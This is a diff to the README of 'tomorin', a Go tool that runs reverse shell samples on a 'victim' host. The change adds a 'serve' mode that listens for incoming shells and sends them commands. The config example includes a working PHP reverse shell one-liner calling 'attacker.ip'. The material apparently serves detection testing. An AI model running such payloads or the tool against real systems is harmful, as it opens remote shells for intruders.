@@ -6,24 +6,43 @@
 go build -o ./bin/tomorin
 ```
 
-## Usage
+### attacker
 
 ```
-ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin
-Run multiple reverse shell samples
+ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin serve -h
+Run reverse shell server
 
 Usage:
-  tomorin [command]
-
-Available Commands:
-  completion  Generate the autocompletion script for the specified shell
-  help        Help about any command
-  run         Run reverse shell samples on the target
+  tomorin serve [flags]
 
 Flags:
-  -h, --help   help for tomorin
+  -a, --address strings   Addresses to listen, each of which has the format of [PROTO:[IP:]]PORT. If PROTO is not specified, then "tcp" will be used. If IP is not specified, then "udp" will be used.
+      --cmd string        Command to be executed once a remove host is connected (default "whoami && sleep 2")
+      --cmd-exit          Whether to append an "exit" to the end of the provided cmd. This should always be true if you want a graceful exit on the remote shell. (default true)
+  -h, --help              help for serve
+      --tcp-timeout int   Timeout for each connection. Applied to TCP only (default 10)
+```
 
-Use "tomorin [command] --help" for more information about a command.
+监听 TCP 29007 和 UDP 29008 端口。当victim连接上端口的时候，发送指定的cmd然后退出。
+
+```bash
+./bin/tomorin serve -a tcp:29007 -a udp:29008
+```
+
+### victim
+
+```
+ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin run -h
+Run reverse shell samples from current host
+
+Usage:
+  tomorin run [flags]
+
+Flags:
+  -c, --config string   Path to the config file (default "config.yml")
+  -h, --help            help for run
+      --timeout int     Timeout of each sample (default 10)
+      --wait int        Timeout until the next sample (default 7)
 ```
 
 编写 `config.yml`，把反弹Shell样本写入 `samples` 字段，把依赖项写入 `depends` 字段，比如
@@ -38,8 +57,6 @@ samples:
   script: php -r '$sock=fsockopen("attacker.ip",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-> 目前还没有反弹shell server的功能，所以需要用nc拉起来单独的server。
-
 确认所有依赖都无误之后，执行所有反弹Shell样本
 
 ```bash
@@ -48,6 +65,6 @@ samples:
 
 ## TODO
 
-- [ ] Reverse shell server
-    - [ ] TCP
-    - [ ] UDP
+- [ x ] Reverse shell server
+    - [ x ] TCP
+    - [ x ] UDP
